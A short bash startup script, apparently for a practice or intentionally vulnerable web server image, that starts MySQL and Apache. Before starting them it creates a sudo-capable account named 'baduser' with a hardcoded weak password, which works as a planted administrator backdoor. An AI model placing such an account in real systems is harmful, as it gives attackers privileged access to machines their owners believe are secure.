!/bin/bash
useradd -p $(openssl passwd -crypt apero) baduser
usermod -a baduser -G sudo
/etc/init.d/mysql start
/usr/sbin/apache2ctl -D FOREGROUND
